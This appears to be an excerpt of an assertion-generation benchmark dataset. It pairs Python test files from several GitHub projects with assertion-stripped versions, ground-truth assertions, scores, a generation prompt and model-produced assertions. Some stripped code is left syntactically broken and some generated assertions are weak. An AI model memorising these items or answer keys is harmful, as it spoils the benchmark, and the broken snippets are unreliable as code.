28        self.https_url = ""https://github.com/otsaloma/helsinki-city-bikes""
29
30    def teardown_method(self, method):
31        self.pool.terminate()
32
33    def test_get__2(self):
34        connection1 = self.pool.get(self.http_url)
35        connection2 = self.pool.get(self.http_url)
36
37    def test_get__http(self):
38        connection = self.pool.get(self.http_url)
39
40    def test_get__https(self):
41        connection = self.pool.get(self.https_url)
42
43    def test_get__terminate_blocking(self):
44        kwargs = dict(target=self.pool.get, args=(self.http_url,))
45        threading.Thread(**kwargs).start()
46        threading.Thread(**kwargs).start()
47        # The third of these calls should block, but gracefully exit
48        # by raising an exception when terminate is called.
49        threading.Thread(**kwargs).start()
50        self.pool.terminate()
51        time.sleep(3)
52
53    def test_is_alive(self):
54        self.pool.terminate()
55
56    def test_put(self):
57        connection = self.pool.get(self.http_url)
58        self.pool.put(self.http_url, connection)
59        connection = self.pool.get(self.http_url)
60
61    def test_reset(self):
62        connection = self.pool.get(self.http_url)
63        self.pool.put(self.http_url, connection)
64        self.pool.reset(self.http_url)
65        connection = self.pool.get(self.http_url)
66
67    def test_terminate(self):
68        self.pool.terminate()
69
70
71class TestModule(hcb.test.TestCase):
72
73    def test_request_json(self):
74        url = ""https://api.github.com/repos/otsaloma/helsinki-city-bikes/releases""
75        json = hcb.http.request_json(url)
76
77    def test_request_json__error(self):
78        url = ""https://github.com/otsaloma/helsinki-city-bikes""
79
80    def test_request_url(self):
81        url = ""https://github.com/otsaloma/helsinki-city-bikes""
82        blob = hcb.http.request_url(url, encoding=""utf_8"")
83
84    def test_request_url__error(self):
85        url = ""http://xxx.yyy.zzz/""
86
87    def test_request_url__non_200(self):
88        url = ""http://www.google.com/xxx/yyy/zzz""
89","[['connection1', '==', 'not None'], ['connection2', '==', 'not None'], ['connection', '==', 'not None'], ['connection', '==', 'not None'], ['self.pool.is_alive()', '==', 'True'], ['self.pool.is_alive()', '==', 'False'], ['connection', '==', 'not None'], ['connection', '==', 'not None'], ['connection', '==', 'not None'], ['connection', '==', 'not None'], ['self.pool.is_alive()', '==', 'False'], ['blob.strip().startswith(""<!DOCTYPE', 'html>"")']]",16,12,0.75,0.0032813781788351,"['method', 'self.pool', 'self.http_url', 'self.https_url', 'connection1', 'connection2', 'connection', 'kwargs', 'url', 'json', 'blob']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['method', 'self.pool', 'self.http_url', 'self.https_url', 'connection1', 'connection2', 'connection', 'kwargs', 'url', 'json', 'blob']
*Code:

1# -*- coding: utf-8 -*-
2
3# Copyright (C) 2015 Osmo Salomaa
4#
5# This program is free software: you can redistribute it and/or modify
6# it under the terms of the GNU General Public License as published by
7# the Free Software Foundation, either version 3 of the License, or
8# (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU General Public License for more details.
14#
15# You should have received a copy of the GNU General Public License
16# along with this program.  If not, see <http://www.gnu.org/licenses/>.
17
18import hcb.test
19import threading
20import time
21
22
23class TestConnectionPool(hcb.test.TestCase):
24
25    def setup_method(self, method):
26        self.pool = hcb.http.ConnectionPool(2)
27        self.http_url = ""http://github.com/otsaloma/helsinki-city-bikes""
28        self.https_url = ""https://github.com/otsaloma/helsinki-city-bikes""
29
30    def teardown_method(self, method):
31        self.pool.terminate()
32
33    def test_get__2(self):
34        connection1 = self.pool.get(self.http_url)
35        connection2 = self.pool.get(self.http_url)
36
37    def test_get__http(self):
38        connection = self.pool.get(self.http_url)
39
40    def test_get__https(self):
41        connection = self.pool.get(self.https_url)
42
43    def test_get__terminate_blocking(self):
44        kwargs = dict(target=self.pool.get, args=(self.http_url,))
45        threading.Thread(**kwargs).start()
46        threading.Thread(**kwargs).start()
47        # The third of these calls should block, but gracefully exit
48        # by raising an exception when terminate is called.
49        threading.Thread(**kwargs).start()
50        self.pool.terminate()
51        time.sleep(3)
52
53    def test_is_alive(self):
54        self.pool.terminate()
55
56    def test_put(self):
57        connection = self.pool.get(self.http_url)
58        self.pool.put(self.http_url, connection)
59        connection = self.pool.get(self.http_url)
60
61    def test_reset(self):
62        connection = self.pool.get(self.http_url)
63        self.pool.put(self.http_url, connection)
64        self.pool.reset(self.http_url)
65        connection = self.pool.get(self.http_url)
66
67    def test_terminate(self):
68        self.pool.terminate()
69
70
71class TestModule(hcb.test.TestCase):
72
73    def test_request_json(self):
74        url = ""https://api.github.com/repos/otsaloma/helsinki-city-bikes/releases""
75        json = hcb.http.request_json(url)
76
77    def test_request_json__error(self):
78        url = ""https://github.com/otsaloma/helsinki-city-bikes""
79
80    def test_request_url(self):
81        url = ""https://github.com/otsaloma/helsinki-city-bikes""
82        blob = hcb.http.request_url(url, encoding=""utf_8"")
83
84    def test_request_url__error(self):
85        url = ""http://xxx.yyy.zzz/""
86
87    def test_request_url__non_200(self):
88        url = ""http://www.google.com/xxx/yyy/zzz""
89",4628,"[[26, 'self.pool', '!=', None, 'pool should be successfully initialized'],
 [34, 'connection1', '!=', None, 'to ensure a connection is made'],
 [35, 'connection2', '!=', None, 'to ensure a second connection is made'],
 [38, 'connection', '!=', None, 'to ensure a secure connection is made'],
 [57, 'connection', '!=', None, 'to test if a connection is made before putting it back to pool'],
 [62, 'connection', '!=', None, 'an existing connection is necessary to test the reset function'],
 [75, 'json', '!=', None, 'to ensure json data is received'],
 [82, 'blob', '!=', None, 'to ensure request_url returns a value']]"
hryamzik/ansible,"# -*- coding: utf-8 -*-
#
# Copyright: (c) 2017, F5 Networks Inc.
# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

import os
import json
import pytest
import sys

from nose.plugins.skip import SkipTest
if sys.version_info < (2, 7):
    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")

from ansible.compat.tests import unittest
from ansible.compat.tests.mock import Mock
from ansible.compat.tests.mock import patch
from ansible.module_utils.basic import AnsibleModule

try:
    from library.modules.bigiq_application_https_waf import ApiParameters
    from library.modules.bigiq_application_https_waf import ModuleParameters
    from library.modules.bigiq_application_https_waf import ModuleManager
    from library.modules.bigiq_application_https_waf import ArgumentSpec
    from library.module_utils.network.f5.common import F5ModuleError
    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
    from test.unit.modules.utils import set_module_args
except ImportError:
    try:
        from ansible.modules.network.f5.bigiq_application_https_waf import ApiParameters
        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleParameters
        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleManager
        from ansible.modules.network.f5.bigiq_application_https_waf import ArgumentSpec
        from ansible.module_utils.network.f5.common import F5ModuleError
        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
        from units.modules.utils import set_module_args
    except ImportError:
        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")

fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
fixture_data = {}


def load_fixture(name):
    path = os.path.join(fixture_path, name)

    if path in fixture_data:
        return fixture_data[path]

    with open(path) as f:
        data = f.read()

    try:
        data = json.loads(data)
    except Exception:
        pass

    fixture_data[path] = data
    return data


class TestParameters(unittest.TestCase):
    def test_module_parameters(self):
        args = dict(
            name='foo',
            description='my description',
            service_environment='bar',
            servers=[
                dict(
                    address='1.2.3.4',
                    port=8080
                ),
                dict(
                    address='5.6.7.8',
                    port=8000
                )
            ],
            inbound_virtual=dict(
                address='2.2.2.2',
                netmask='255.255.255.255',
                port=80
            ),
            redirect_virtual=dict(
                address='3.3.3.3',
                netmask='255.255.255.255',
                port=80
            ),
            domain_names=[
                'foo.baz.com',
                'bar.baz.com'
            ]
        )

        p = ModuleParameters(params=args)
        assert p.name == 'foo'
        assert p.config_set_name == 'foo'
        assert p.sub_path == 'foo'
        assert p.http_profile == 'profile_http'
        assert p.service_environment == 'bar'
        assert len(p.servers) == 2
        assert 'address' in p.servers[0]
        assert 'port' in p.servers[0]
        assert 'address' in p.servers[1]
        assert 'port' in p.servers[1]
        assert p.servers[0]['address'] == '1.2.3.4'
        assert p.servers[0]['port'] == 8080
        assert p.servers[1]['address'] == '5.6.7.8'
        assert p.servers[1]['port'] == 8000
        assert 'address' in p.inbound_virtual
        assert 'netmask' in p.inbound_virtual
        assert 'port' in p.inbound_virtual
        assert p.inbound_virtual['address'] == '2.2.2.2'
        assert p.inbound_virtual['netmask'] == '255.255.255.255'
        assert p.inbound_virtual['port'] == 80
        assert 'address' in p.redirect_virtual
        assert 'netmask' in p.redirect_virtual
        assert 'port' in p.redirect_virtual
        assert p.redirect_virtual['address'] == '3.3.3.3'
        assert p.redirect_virtual['netmask'] == '255.255.255.255'
        assert p.redirect_virtual['port'] == 80


@patch('ansible.module_utils.f5_utils.AnsibleF5Client._get_mgmt_root',
       return_value=True)
class TestManager(unittest.TestCase):

    def setUp(self):
        self.spec = ArgumentSpec()
        self.patcher1 = patch('time.sleep')
        self.patcher1.start()

    def tearDown(self):
        self.patcher1.stop()

    def test_create(self, *args):
        set_module_args(dict(
            name='foo',
            description='my description',
            service_environment='bar',
            servers=[
                dict(
                    address='1.2.3.4',
                    port=8080
                ),
                dict(
                    address='5.6.7.8',
                    port=8000
                )
            ],
            inbound_virtual=dict(
                address='2.2.2.2',
                netmask='255.255.255.255',
                port=80
            ),
            redirect_virtual=dict(
                address='3.3.3.3',
                netmask='255.255.255.255',
                port=80
            ),
            domain_names=[
                'foo.baz.com',
                'bar.baz.com'
            ],
            provider=dict(
                server='localhost',
                password='password',
                user='admin'
            )
        ))

        module = AnsibleModule(
            argument_spec=self.spec.argument_spec,
            supports_check_mode=self.spec.supports_check_mode
        )

        # Override methods to force specific logic in the module to happen
        mm = ModuleManager(module=module)
        mm.has_no_service_environment = Mock(return_value=False)
        mm.wait_for_apply_template_task = Mock(return_value=True)

        mm.create_on_device = Mock(return_value=True)
        mm.exists = Mock(side_effect=[False, True])

        results = mm.exec_module()

        assert results['changed'] is True
        assert results['description'] == 'my description'
","
1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2017, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14from nose.plugins.skip import SkipTest
15if sys.version_info < (2, 7):
16    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")
17
18from ansible.compat.tests import unittest
19from ansible.compat.tests.mock import Mock
20from ansible.compat.tests.mock import patch
21from ansible.module_utils.basic import AnsibleModule
22
23try:
24    from library.modules.bigiq_application_https_waf import ApiParameters
25    from library.modules.bigiq_application_https_waf import ModuleParameters
26    from library.modules.bigiq_application_https_waf import ModuleManager
27    from library.modules.bigiq_application_https_waf import ArgumentSpec
28    from library.module_utils.network.f5.common import F5ModuleError
29    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
30    from test.unit.modules.utils import set_module_args
31except ImportError:
32    try:
33        from ansible.modules.network.f5.bigiq_application_https_waf import ApiParameters
34        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleParameters
35        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleManager
36        from ansible.modules.network.f5.bigiq_application_https_waf import ArgumentSpec
37        from ansible.module_utils.network.f5.common import F5ModuleError
38        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
39        from units.modules.utils import set_module_args
40    except ImportError:
41        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")
42
43fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
44fixture_data = {}
45
46
47def load_fixture(name):
48    path = os.path.join(fixture_path, name)
49
50    if path in fixture_data:
51        return fixture_data[path]
52
53    with open(path) as f:
54        data = f.read()
55
56    try:
57        data = json.loads(data)
58    except Exception:
59        pass
60
61    fixture_data[path] = data
62    return data
63
64
65class TestParameters(unittest.TestCase):
66    def test_module_parameters(self):
67        args = dict(
68            name='foo',
69            description='my description',
70            service_environment='bar',
71            servers=[
72                dict(
73                    address='1.2.3.4',
74                    port=8080
75                ),
76                dict(
77                    address='5.6.7.8',
78                    port=8000
79                )
80            ],
81            inbound_virtual=dict(
82                address='2.2.2.2',
83                netmask='255.255.255.255',
84                port=80
85            ),
86            redirect_virtual=dict(
87                address='3.3.3.3',
88                netmask='255.255.255.255',
89                port=80
90            ),
91            domain_names=[
92                'foo.baz.com',
93                'bar.baz.com'
94            ]
95        )
96
97        p = ModuleParameters(params=args)
98
99
100@patch('ansible.module_utils.f5_utils.AnsibleF5Client._get_mgmt_root',
101       return_value=True)
102class TestManager(unittest.TestCase):
103
104    def setUp(self):
105        self.spec = ArgumentSpec()
106        self.patcher1 = patch('time.sleep')
107        self.patcher1.start()
108
109    def tearDown(self):
110        self.patcher1.stop()
111
112    def test_create(self, *args):
113        set_module_args(dict(
114            name='foo',
115            description='my description',
116            service_environment='bar',
117            servers=[
118                dict(
119                    address='1.2.3.4',
120                    port=8080
121                ),
122                dict(
123                    address='5.6.7.8',
124                    port=8000
125                )
126            ],
127            inbound_virtual=dict(
128                address='2.2.2.2',
129                netmask='255.255.255.255',
130                port=80
131            ),
132            redirect_virtual=dict(
133                address='3.3.3.3',
134                netmask='255.255.255.255',
135                port=80
136            ),
137            domain_names=[
138                'foo.baz.com',
139                'bar.baz.com'
140            ],
141            provider=dict(
142                server='localhost',
143                password='password',
144                user='admin'
145            )
146        ))
147
148        module = AnsibleModule(
149            argument_spec=self.spec.argument_spec,
150            supports_check_mode=self.spec.supports_check_mode
151        )
152
153        # Override methods to force specific logic in the module to happen
154        mm = ModuleManager(module=module)
155        mm.has_no_service_environment = Mock(return_value=False)
156        mm.wait_for_apply_template_task = Mock(return_value=True)
157
158        mm.create_on_device = Mock(return_value=True)
159        mm.exists = Mock(side_effect=[False, True])
160
161        results = mm.exec_module()
162
163","[['p.name', '==', ""'foo'""], ['p.config_set_name', '==', ""'foo'""], ['p.sub_path', '==', ""'foo'""], ['p.http_profile', '==', ""'profile_http'""], ['p.service_environment', '==', ""'bar'""], ['len(p.servers)', '==', '2'], [""p.servers[0]['address']"", '==', ""'1.2.3.4'""], [""p.servers[0]['port']"", '==', '8080'], [""p.servers[1]['address']"", '==', ""'5.6.7.8'""], [""p.servers[1]['port']"", '==', '8000'], [""p.inbound_virtual['address']"", '==', ""'2.2.2.2'""], [""p.inbound_virtual['netmask']"", '==', ""'255.255.255.255'""], [""p.inbound_virtual['port']"", '==', '80'], [""p.redirect_virtual['address']"", '==', ""'3.3.3.3'""], [""p.redirect_virtual['netmask']"", '==', ""'255.255.255.255'""], [""p.redirect_virtual['port']"", '==', '80'], [""results['changed']"", '==', 'True'], [""results['description']"", '==', ""'my description'""]]",28,18,0.6428571428571429,0.002855782960495,"['__metaclass__', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', 'self.patcher1', '*args', 'module', 'mm', 'mm.has_no_service_environment', 'mm.wait_for_apply_template_task', 'mm.create_on_device', 'mm.exists', 'results']",19,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__metaclass__', 'fixture_path', 'fixture_data', 'name', 'path', 'data', 'fixture_data[path]', 'args', 'p', 'self.spec', 'self.patcher1', '*args', 'module', 'mm', 'mm.has_no_service_environment', 'mm.wait_for_apply_template_task', 'mm.create_on_device', 'mm.exists', 'results']
*Code:

1# -*- coding: utf-8 -*-
2#
3# Copyright: (c) 2017, F5 Networks Inc.
4# GNU General Public License v3.0 (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)
5
6from __future__ import (absolute_import, division, print_function)
7__metaclass__ = type
8
9import os
10import json
11import pytest
12import sys
13
14from nose.plugins.skip import SkipTest
15if sys.version_info < (2, 7):
16    raise SkipTest(""F5 Ansible modules require Python >= 2.7"")
17
18from ansible.compat.tests import unittest
19from ansible.compat.tests.mock import Mock
20from ansible.compat.tests.mock import patch
21from ansible.module_utils.basic import AnsibleModule
22
23try:
24    from library.modules.bigiq_application_https_waf import ApiParameters
25    from library.modules.bigiq_application_https_waf import ModuleParameters
26    from library.modules.bigiq_application_https_waf import ModuleManager
27    from library.modules.bigiq_application_https_waf import ArgumentSpec
28    from library.module_utils.network.f5.common import F5ModuleError
29    from library.module_utils.network.f5.common import iControlUnexpectedHTTPError
30    from test.unit.modules.utils import set_module_args
31except ImportError:
32    try:
33        from ansible.modules.network.f5.bigiq_application_https_waf import ApiParameters
34        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleParameters
35        from ansible.modules.network.f5.bigiq_application_https_waf import ModuleManager
36        from ansible.modules.network.f5.bigiq_application_https_waf import ArgumentSpec
37        from ansible.module_utils.network.f5.common import F5ModuleError
38        from ansible.module_utils.network.f5.common import iControlUnexpectedHTTPError
39        from units.modules.utils import set_module_args
40    except ImportError:
41        raise SkipTest(""F5 Ansible modules require the f5-sdk Python library"")
42
43fixture_path = os.path.join(os.path.dirname(__file__), 'fixtures')
44fixture_data = {}
45
46
47def load_fixture(name):
48    path = os.path.join(fixture_path, name)
49
50    if path in fixture_data:
51        return fixture_data[path]
52
53    with open(path) as f:
54        data = f.read()
55
56    try:
57        data = json.loads(data)
58    except Exception:
59        pass
60
61    fixture_data[path] = data
62    return data
63
64
65class TestParameters(unittest.TestCase):
66    def test_module_parameters(self):
67        args = dict(
68            name='foo',
69            description='my description',
70            service_environment='bar',
71            servers=[
72                dict(
73                    address='1.2.3.4',
74                    port=8080
75                ),
76                dict(
77                    address='5.6.7.8',
78                    port=8000
79                )
80            ],
81            inbound_virtual=dict(
82                address='2.2.2.2',
83                netmask='255.255.255.255',
84                port=80
85            ),
86            redirect_virtual=dict(
87                address='3.3.3.3',
88                netmask='255.255.255.255',
89                port=80
90            ),
91            domain_names=[
92                'foo.baz.com',
93                'bar.baz.com'
94            ]
95        )
96
97        p = ModuleParameters(params=args)
98
99
100@patch('ansible.module_utils.f5_utils.AnsibleF5Client._get_mgmt_root',
101       return_value=True)
102class TestManager(unittest.TestCase):
103
104    def setUp(self):
105        self.spec = ArgumentSpec()
106        self.patcher1 = patch('time.sleep')
107        self.patcher1.start()
108
109    def tearDown(self):
110        self.patcher1.stop()
111
112    def test_create(self, *args):
113        set_module_args(dict(
114            name='foo',
115            description='my description',
116            service_environment='bar',
117            servers=[
118                dict(
119                    address='1.2.3.4',
120                    port=8080
121                ),
122                dict(
123                    address='5.6.7.8',
124                    port=8000
125                )
126            ],
127            inbound_virtual=dict(
128                address='2.2.2.2',
129                netmask='255.255.255.255',
130                port=80
131            ),
132            redirect_virtual=dict(
133                address='3.3.3.3',
134                netmask='255.255.255.255',
135                port=80
136            ),
137            domain_names=[
138                'foo.baz.com',
139                'bar.baz.com'
140            ],
141            provider=dict(
142                server='localhost',
143                password='password',
144                user='admin'
145            )
146        ))
147
148        module = AnsibleModule(
149            argument_spec=self.spec.argument_spec,
150            supports_check_mode=self.spec.supports_check_mode
151        )
152
153        # Override methods to force specific logic in the module to happen
154        mm = ModuleManager(module=module)
155        mm.has_no_service_environment = Mock(return_value=False)
156        mm.wait_for_apply_template_task = Mock(return_value=True)
157
158        mm.create_on_device = Mock(return_value=True)
159        mm.exists = Mock(side_effect=[False, True])
160
161        results = mm.exec_module()
162
163",7042,"[[47, 'name', '!=', None, 'name parameter is required for loading fixture'],
 [113, '*args', '>=', 1, 'At least one argument needed to create test'],
 [147, 'self.spec', '!=', None, 'Specification cannot be None'],
 [154, 'module', '!=', None, 'module is required for ModuleManager']]"
mythmon/kitsune,"from datetime import datetime

from nose.tools import eq_

from kitsune.notifications.tests import NotificationFactory
from kitsune.sumo.tests import TestCase


class TestNotificationModel(TestCase):

    def test_is_read_false(self):
        n = NotificationFactory(read_at=None)
        eq_(n.is_read, False)

    def test_is_read_true(self):
        n = NotificationFactory(read_at=datetime.now())
        eq_(n.is_read, True)

    def test_set_is_read_true(self):
        n = NotificationFactory(read_at=None)
        n.is_read = True
        assert n.read_at is not None

    def test_set_is_read_false(self):
        n = NotificationFactory(read_at=datetime.now())
        n.is_read = False
        assert n.read_at is None
","
1from datetime import datetime
2
3from nose.tools import eq_
4
5from kitsune.notifications.tests import NotificationFactory
6from kitsune.sumo.tests import TestCase
7
8
9class TestNotificationModel(TestCase):
10
11    def test_is_read_false(self):
12        n = NotificationFactory(read_at=None)
13        eq_(n.is_read, False)
14
15    def test_is_read_true(self):
16        n = NotificationFactory(read_at=datetime.now())
17        eq_(n.is_read, True)
18
19    def test_set_is_read_true(self):
20        n = NotificationFactory(read_at=None)
21        n.is_read = True
22
23    def test_set_is_read_false(self):
24        n = NotificationFactory(read_at=datetime.now())
25        n.is_read = False
26","[['n.read_at', '==', 'not None'], ['n.read_at', '==', 'None']]",2,2,1.0,0.0027397260273972,"['n', 'n.is_read']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['n', 'n.is_read']
*Code:

1from datetime import datetime
2
3from nose.tools import eq_
4
5from kitsune.notifications.tests import NotificationFactory
6from kitsune.sumo.tests import TestCase
7
8
9class TestNotificationModel(TestCase):
10
11    def test_is_read_false(self):
12        n = NotificationFactory(read_at=None)
13        eq_(n.is_read, False)
14
15    def test_is_read_true(self):
16        n = NotificationFactory(read_at=datetime.now())
17        eq_(n.is_read, True)
18
19    def test_set_is_read_true(self):
20        n = NotificationFactory(read_at=None)
21        n.is_read = True
22
23    def test_set_is_read_false(self):
24        n = NotificationFactory(read_at=datetime.now())
25        n.is_read = False
26",2102,"[[12, 'n', '!=', None, ""n should not be None after being set by NotificationFactory""],
 [16, 'n', '!=', None, ""n should not be None after being set by NotificationFactory""],
 [20, 'n', '!=', None, ""n should not be None after being set by NotificationFactory""],
 [24, 'n', '!=', None, ""n should not be None after being set by NotificationFactory""]]"
warmspringwinds/scikit-image,"import os

import numpy as np
from numpy.testing import assert_raises, assert_equal, assert_allclose

from skimage import data_dir
from skimage.io.collection import MultiImage, ImageCollection

import six


class TestMultiImage():

    def setUp(self):
        # This multipage TIF file was created with imagemagick:
        # convert im1.tif im2.tif -adjoin multipage.tif
        paths = [os.path.join(data_dir, 'multipage.tif'),
                 os.path.join(data_dir, 'no_time_for_that.gif')]
        self.imgs = [MultiImage(paths[0]),
                     MultiImage(paths[0], conserve_memory=False),
                     MultiImage(paths[1]),
                     MultiImage(paths[1], conserve_memory=False),
                     ImageCollection(paths[0]),
                     ImageCollection(paths[1], conserve_memory=False),
                     ImageCollection('%s:%s' % (paths[0], paths[1]))]

    def test_len(self):
        assert len(self.imgs[0]) == len(self.imgs[1]) == 2
        assert len(self.imgs[2]) == len(self.imgs[3]) == 24
        assert len(self.imgs[4]) == 2
        assert len(self.imgs[5]) == 24
        assert len(self.imgs[6]) == 26, len(self.imgs[6])

    def test_slicing(self):
        img = self.imgs[-1]
        assert type(img[:]) is ImageCollection
        assert len(img[:]) == 26, len(img[:])
        assert len(img[:1]) == 1
        assert len(img[1:]) == 25
        assert_allclose(img[0], img[:1][0])
        assert_allclose(img[1], img[1:][0])
        assert_allclose(img[-1], img[::-1][0])
        assert_allclose(img[0], img[::-1][-1])

    def test_getitem(self):
        for img in self.imgs:
            num = len(img)

            for i in range(-num, num):
                assert type(img[i]) is np.ndarray
            assert_allclose(img[0], img[-num])

            assert_raises(AssertionError,
                          assert_allclose,
                          img[0], img[1])

            # assert_raises expects a callable, hence this thin wrapper function.
            def return_img(n):
                return img[n]
            assert_raises(IndexError, return_img, num)
            assert_raises(IndexError, return_img, -num - 1)

    def test_files_property(self):
        for img in self.imgs:
            if isinstance(img, ImageCollection):
                continue

            assert isinstance(img.filename, six.string_types)

            def set_filename(f):
                img.filename = f
            assert_raises(AttributeError, set_filename, 'newfile')

    def test_conserve_memory_property(self):
        for img in self.imgs:
            assert isinstance(img.conserve_memory, bool)

            def set_mem(val):
                img.conserve_memory = val
            assert_raises(AttributeError, set_mem, True)

    def test_concatenate(self):
        for img in self.imgs:
            if img[0].shape != img[-1].shape:
                assert_raises(ValueError, img.concatenate)
                continue
            array = img.concatenate()
            assert_equal(array.shape, (len(img),) + img[0].shape)


if __name__ == ""__main__"":
    from numpy.testing import run_module_suite
    run_module_suite()
","
1import os
2
3import numpy as np
4
5from skimage import data_dir
6from skimage.io.collection import MultiImage, ImageCollection
7
8import six
9
10
11class TestMultiImage():
12
13    def setUp(self):
14        # This multipage TIF file was created with imagemagick:
15        # convert im1.tif im2.tif -adjoin multipage.tif
16        paths = [os.path.join(data_dir, 'multipage.tif'),
17                 os.path.join(data_dir, 'no_time_for_that.gif')]
18        self.imgs = [MultiImage(paths[0]),
19                     MultiImage(paths[0], conserve_memory=False),
20                     MultiImage(paths[1]),
21                     MultiImage(paths[1], conserve_memory=False),
22                     ImageCollection(paths[0]),
23                     ImageCollection(paths[1], conserve_memory=False),
24                     ImageCollection('%s:%s' % (paths[0], paths[1]))]
25
26    def test_len(self):
27
28    def test_slicing(self):
29        img = self.imgs[-1]
30
31    def test_getitem(self):
32        for img in self.imgs:
33            num = len(img)
34
35            for i in range(-num, num):
36
37                          img[0], img[1])
38
39            def return_img(n):
40                return img[n]
41
42    def test_files_property(self):
43        for img in self.imgs:
44            if isinstance(img, ImageCollection):
45                continue
46
47
48            def set_filename(f):
49                img.filename = f
50
51    def test_conserve_memory_property(self):
52        for img in self.imgs:
53
54            def set_mem(val):
55                img.conserve_memory = val
56
57    def test_concatenate(self):
58        for img in self.imgs:
59            if img[0].shape != img[-1].shape:
60                continue
61            array = img.concatenate()
62
63
64if __name__ == ""__main__"":
65    from numpy.testing import run_module_suite
66    run_module_suite()
67","[['len(self.imgs[0])', '==', 'len(self.imgs[1]) == 2'], ['len(self.imgs[2])', '==', 'len(self.imgs[3]) == 24'], ['len(self.imgs[4])', '==', '2'], ['len(self.imgs[5])', '==', '24'], ['len(self.imgs[6])', '==', '26'], ['type(img[:])', '==', 'ImageCollection'], ['len(img[:])', '==', '26'], ['len(img[:1])', '==', '1'], ['len(img[1:])', '==', '25'], ['type(img[i])', '==', 'np.ndarray']]",27,10,0.3703703703703703,0.0031377470975839,"['paths', 'self.imgs', 'img', 'num', 'n', 'f', 'img.filename', 'val', 'img.conserve_memory', 'array']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
